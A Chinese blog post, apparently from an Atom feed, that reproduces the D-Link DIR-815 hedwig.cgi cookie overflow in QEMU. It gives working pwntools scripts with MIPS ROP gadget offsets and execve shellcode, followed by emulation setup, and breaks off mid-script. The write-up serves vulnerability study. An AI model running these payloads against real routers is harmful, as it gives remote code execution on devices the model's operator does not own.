<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>S1nec-1o&#39;s B1og</title>
  
  
  <link href="http://s1nec-1o.github.io/atom.xml" rel="self"/>
  
  <link href="http://s1nec-1o.github.io/"/>
  <updated>2024-05-21T14:23:56.493Z</updated>
  <id>http://s1nec-1o.github.io/</id>
  
  <author>
    <name>s1nec-1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DIR-815漏洞复现</title>
    <link href="http://s1nec-1o.github.io/2024/05/21/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2024/05/21/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-05-21T14:21:25.000Z</published>
    <updated>2024-05-21T14:23:56.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DIR-815"><a href="#DIR-815" class="headerlink" title="DIR-815"></a>DIR-815</h1><p>仔细研读了winmt师傅和ZIKH26师傅的复现，现在自己来复现一遍</p><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223733.png" alt="image-20240425225544242" style="zoom:50%;" /><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>该部分可以看<a href="https://zikh26.github.io/posts/d1f081a9.html">ZIKH26师傅的blog</a>，原本是想在师傅的分析上补充的，但是事情太多了，最后看的脑子疼，只能暂且搁置了</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="确认libc-base"><a href="#确认libc-base" class="headerlink" title="确认libc_base"></a>确认libc_base</h3><p>由于该gdb是链接在qemu模式下的，因此不能直接通过vmmap得到libc基址，而直接libc又因为权限不足无法使用，又因为<strong>这个路由设备的真机就是没有开地址随机化的</strong>，因此我们只需要**通过找一个<code>libc</code>函数地址减去偏移来得到<code>libc_base</code>**，而因为“延迟绑定的特性”，要找两个使用libc函数的地址</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223735.png" alt="image-20240422235933593" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223736.png" alt="image-20240423000016590" style="zoom: 50%;" /><p>可以得到memset的地址在0x7f76ca20</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223737.png" alt="image-20240423000125429"></p><p>可以得到libc_base&#x3D;0x7f76ca20-0x034A20&#x3D;0x7F738000</p><h3 id="确认溢出大小"><a href="#确认溢出大小" class="headerlink" title="确认溢出大小"></a>确认溢出大小</h3><p>首先，<code>cyclic 2000 &gt; payload</code>，将生成的<code>2000</code>个字符存放到<code>payload</code>文件中，再用以下<code>shell</code>脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">INPUT=<span class="string">&quot;winmt=pwner&quot;</span></span><br><span class="line">LEN=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$INPUT</span>&quot;</span> | <span class="built_in">wc</span> -c)</span><br><span class="line">cookie=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INPUT</span> | qemu-mipsel -L ./ -0 <span class="string">&quot;hedwig.cgi&quot;</span> -E REQUEST_METHOD=<span class="string">&quot;POST&quot;</span> -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> -E HTTP_COOKIE=<span class="variable">$cookie</span> -E REQUEST_URI=<span class="string">&quot;2333&quot;</span> -g 1234 ./htdocs/cgibin</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223738.png" alt="image-20240423000624091" style="zoom:50%;" /><p>得到了libc_base和溢出大小，现在就要寻找对应的gadget来提权</p><p>此时的寄存器为</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223739.png" alt="image-20240423194608538" style="zoom:50%;" /><p>发现S8恰好为返回地址的上一位，S7，S6直到S0逐渐递减，因此可以控制S0-S8以此构造ROP链</p><h2 id="qemu用户模式复现"><a href="#qemu用户模式复现" class="headerlink" title="qemu用户模式复现"></a>qemu用户模式复现</h2><h3 id="寻找ROPgadget"><a href="#寻找ROPgadget" class="headerlink" title="寻找ROPgadget"></a>寻找ROPgadget</h3><h4 id="复习一下gadget的寻找"><a href="#复习一下gadget的寻找" class="headerlink" title="复习一下gadget的寻找"></a>复习一下gadget的寻找</h4><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223740.png" alt="image-20240423185734832" style="zoom: 33%;" /><p>其中比较重要的是$v0为函数返回值存放的寄存器，$ra存在返回地址，$a0-$a3存在函数的四个调用参数，当需要使用更多的寄存器时，就需要堆栈（stack)了,需要注意的是MIPS编译器总是为参数在堆栈中留有空间以防有参数需要存储。</p><p>因此对于使用ROP进行一般的函数操作来说，寄存器的四个参数已经足够了，因此控制这个四个寄存器对于ROP来说比较关键。</p><p>在uclibc库中，有几个比较关键的gadget，在<code>scandir</code>的尾部或者<code>scandir64</code>的尾部，从图上看基本上可以设置所有寄存器值，从s0-s7</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223741.png" alt="image-20240423185850706" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223742.png" alt="image-20240423185927880" style="zoom:50%;" /><p>有一条比较常规的ROP链，执行的整体流程为 sleep(1) -&gt; read_value_from_stack -&gt; jump to stack(shellcode)</p><h4 id="布置ROP链"><a href="#布置ROP链" class="headerlink" title="布置ROP链"></a>布置ROP链</h4><p><code>system</code>地址末两位是<code>\x00</code>，而<code>sprintf</code>会被<code>\x00</code>截断，因此这里采用的方法是：<strong>读进去<code>system_addr - 1</code>，再找到<code>addiu ..., 1</code>的<code>gadget</code>对其操作后再跳转过去</strong>。</p><p>因此得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x7F738000</span></span><br><span class="line"><span class="comment">#prepare:</span></span><br><span class="line"><span class="comment">#0x000158C8  |  addiu $s0,1  |  jalr  $s5 </span></span><br><span class="line"><span class="comment">#0x00015B74  |  move $a0,$s2 |  jalr  $s0  </span></span><br><span class="line"></span><br><span class="line">payload=<span class="number">973</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x53200</span>-<span class="number">1</span>)        <span class="comment">#s0 system-1</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s1</span></span><br><span class="line">payload+=p32(libc_base+ <span class="number">0x6DFD0</span>)         <span class="comment">#s2 /bin/sh</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s3</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s4 </span></span><br><span class="line">payload+=p32(libc_base+ <span class="number">0x15B74</span>)         <span class="comment">#s5 move $a0,$s2 |  jalr  $s0                   </span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s6</span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s7 </span></span><br><span class="line">payload+=<span class="number">4</span>*<span class="string">b&#x27;A&#x27;</span>                          <span class="comment">#s8  </span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x000158C8</span>)     <span class="comment">#ra addiu $s0,1  |  jalr  $s5 </span></span><br><span class="line">payload=<span class="string">b&#x27;uid=&#x27;</span> + payload</span><br><span class="line"></span><br><span class="line">post_content=<span class="string">b&#x27;s1nec-1o=pwnner&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">io.send(post_content)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>看了winmt师傅的博客说是用户模式该方法打不通的原因是：这里的<code>system</code>函数中有调用<code>fork()</code>函数，而用户模式是不支持多线程的，这里<code>fork()</code>的失败，会导致后面<code>$fp</code>是个空指针，就会出错，之后在系统模式打就不会出问题了。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223743.png" alt="image-20240423211312592" style="zoom:50%;" /><p>这里就出问题了</p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>到这里需要布置shellcode链，这种做法就不会导致system中的fork使得打不通，因为是直接调用execve，而因为sprintf的0截断，因此shell里不能出现\x00，还要注意不能出现缓存不一致性（需要一个时间来同步），因此先调用一下sleep(1)，再去执行shellcode</p><p>这里还需要提到一个点，因此调用的sleep函数，他的栈会往下移，因此ra和s寄存器的值所在的位置会不一样，我是通过调试确定的，先调试：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223744.png" alt="22e0c1e77961f170faf679ff4d9a3c0a"></p><p>这是先借用winmt师傅的poc，这是到达sleep函数的栈位置可以看到调用sleep的地址-04c与ra所在的地址-004相差了0x48，即18个地址长度，第18个地址就是ra了，再看sleep的源码前面部分：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223745.png" alt="image-20240424191520351"></p><p>发现只有s4-s0，因此可以以此构造ROP链，跳到shellcode，实现ret2shellcode</p><p>在构造ROP链的时候还遇到了很多问题，在jalr到sleep函数的时候，建议间接跳转，因为在sleep函数中会调用各种寄存器，取地址上的值时必须保证寄存器为有效数，而通过间接跳转时，例如在跳转和sleep中间再多加一条链，这样相当于重置寄存器，因为有些寄存器例如gp不会保存就会一直使用等等</p><p>poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#prepare</span></span><br><span class="line"><span class="comment">#0x00057E50  |  li $a0,1                   |  jalr  $s1 </span></span><br><span class="line"><span class="comment">#0x00013F74  |  addiu $s1,$sp,0x28+var_10  |  jalr  $s4 </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x7F738000</span></span><br><span class="line"> </span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x3cd</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s0</span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x436D0</span>) <span class="comment">#s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s2</span></span><br><span class="line">payload+=p32(libc_base + <span class="number">0x56BD0</span>) <span class="comment">#s3  sleep</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s5</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s6</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s7</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>              <span class="comment">#s8</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57E50</span>) <span class="comment">#ra  li $a0,1 | jalr  $s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s0</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s1</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s2</span></span><br><span class="line">payload+=<span class="string">b&#x27;A&#x27;</span>*<span class="number">4</span>            <span class="comment">#s3</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x57E50</span>) <span class="comment">#s4  li $a0,1 | jalr  $s1</span></span><br><span class="line">payload+=p32(libc_base+<span class="number">0x13F74</span>) <span class="comment">#second ra addiu $s1,$sp,0x28+var_10  |  jalr  $s4</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    slti $a2, $zero, -1</span></span><br><span class="line"><span class="string">    li $t7, 0x69622f2f</span></span><br><span class="line"><span class="string">    sw $t7, -12($sp)</span></span><br><span class="line"><span class="string">    li $t6, 0x68732f6e</span></span><br><span class="line"><span class="string">    sw $t6, -8($sp)</span></span><br><span class="line"><span class="string">    sw $zero, -4($sp)</span></span><br><span class="line"><span class="string">    la $a0, -12($sp)</span></span><br><span class="line"><span class="string">    slti $a1, $zero, -1</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">post_content=<span class="string">&#x27;s1nec-1o=pwner&#x27;</span></span><br><span class="line">payload+=<span class="number">0x18</span>*<span class="string">b&#x27;A&#x27;</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;uid=&#x27;</span>+payload</span><br><span class="line">io = process(<span class="string">b&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    qemu-mipsel -L ./ \</span></span><br><span class="line"><span class="string">    -0 &quot;hedwig.cgi&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_METHOD=&quot;POST&quot; \</span></span><br><span class="line"><span class="string">    -E CONTENT_LENGTH=11 \</span></span><br><span class="line"><span class="string">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="string">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot;</span> + payload + <span class="string">b&quot;&quot;&quot;\&quot; \</span></span><br><span class="line"><span class="string">    -E REQUEST_URI=&quot;2333&quot; \</span></span><br><span class="line"><span class="string">    ./htdocs/cgibin</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line">io.send(post_content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>此时就成功getshell了</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223746.png" alt="image-20240424195751503" style="zoom:50%;" /><p>但是ZIKH26师傅：这里执行 <code>execve(&quot;/bin/sh&quot;)</code> 成功其实是一种假象，因为固件中的 <code>/bin/sh</code> 链接到了 <code>busybox</code> 上，虽然 <code>busybox</code> 是静态链接，但因为它是 <code>MIPS</code> 架构，导致了我在 <code>x64</code> 上直接执行是失败的。因此我上面是把原本的 <code>sh</code> 给删掉，换成了主机自带的 <code>x64</code> 架构的 <code>sh</code> ，同时还把相应的动态库都放到了当前的 <code>/lib</code> 下面，才算执行成功。不然用原本的 <code>sh</code> 还是执行失败，这么做的目的仅仅是为了证明这种操作理论上是可以拿到 <code>shell</code> 的</p><h2 id="qemu系统模式复现"><a href="#qemu系统模式复现" class="headerlink" title="qemu系统模式复现"></a>qemu系统模式复现</h2><h3 id="实现宿主机与-qemu-的通信"><a href="#实现宿主机与-qemu-的通信" class="headerlink" title="实现宿主机与 qemu 的通信"></a>实现宿主机与 <code>qemu</code> 的通信</h3><p>创建一个 <code>net.sh</code> 脚本，我这里的网卡是 <code>ens33</code> ，如果是 <code>eth0</code> 的话，就把出现的 <code>ens33</code> 换成 <code>eth0</code> 即可，<code>chmod +x net.sh</code> 给文件可执行权限，然后 <code>./net.sh</code> 运行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#sudo ifconfig eth0 down                 # 首先关闭宿主机网卡接口</span></span><br><span class="line">sudo brctl addbr br0                     <span class="comment"># 添加一座名为 br0 的网桥</span></span><br><span class="line">sudo brctl addif br0 ens33                <span class="comment"># 在 br0 中添加一个接口</span></span><br><span class="line">sudo brctl stp br0 off                   <span class="comment"># 如果只有一个网桥，则关闭生成树协议</span></span><br><span class="line">sudo brctl setfd br0 1                   <span class="comment"># 设置 br0 的转发延迟</span></span><br><span class="line">sudo brctl sethello br0 1                <span class="comment"># 设置 br0 的 hello 时间</span></span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     <span class="comment"># 启用 br0 接口</span></span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    <span class="comment"># 启用网卡接口</span></span><br><span class="line">sudo dhclient br0                        <span class="comment"># 从 dhcp 服务器获得 br0 的 IP 地址</span></span><br><span class="line">sudo brctl show br0                      <span class="comment"># 查看虚拟网桥列表</span></span><br><span class="line">sudo brctl showstp br0                   <span class="comment"># 查看 br0 的各接口信息</span></span><br></pre></td></tr></table></figure><p>然后再执行如下几条命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">sudo tunctl -t tap0 -u root              <span class="comment"># 创建一个 tap0 接口，只允许 root 用户访问</span></span><br><span class="line">sudo brctl addif br0 tap0                <span class="comment"># 在虚拟网桥中增加一个 tap0 接口</span></span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    <span class="comment"># 启用 tap0 接口</span></span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure><p>再用下面这个脚本启动</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure><p>这个系统的链接是ZIKH26师傅的链接：<a href="https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Al04v">https://pan.baidu.com/s/1-qvt7pG0Tr91JKoH2elNdQ?pwd=l04v提取码：l04v</a></p><p>确保此时的系统可以ping通物理机，以便之后的传输文件</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223747.png" alt="image-20240425215309877" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405212223748.png" alt="image-20240425215157154" style="zoom:50%;" /><h4 id="启动-httpd-服务"><a href="#启动-httpd-服务" class="headerlink" title="启动 httpd 服务"></a>启动 <code>httpd</code> 服务</h4><p>在 <code>squashfs-root</code> 的上一级目录中，执行下面的命令， <code>IP</code> 换成 <code>qemu</code> 的。这样可以实现计算机远程之间的文件传输，作用就是把提取出来的文件系统传到 <code>qemu</code> 里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -r ./squashfs-root root@10.214.140.139:/root/squashfs-root</span><br></pre></td></tr></table></figure><p>然后在 <code>qemu</code> 中的 <code>squashfs-root</code> 目录下新建一个 <code>http_conf</code> 文件</p><p>写入以下代码（网卡和 <code>IP</code> <code>port</code> 要改成自己的）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  <span class="comment">#开启log</span></span><br><span class="line">ErrorLog /log <span class="comment">#log文件</span></span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span></span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0  <span class="comment">#对应qemu仿真路由器系统的网卡</span></span><br><span class="line">    Address 192.168.121.128 <span class="comment">#qemu仿真路由器系统的IP</span></span><br><span class="line">    Port <span class="string">&quot;80&quot;</span> <span class="comment">#对应未被使用的端口</span></span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在物理机上 <code>/opt/tools/mipsel</code> 目录（没有的话就自己创建吧）中新建 <code>init.sh</code> 文件，写入如下配置</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 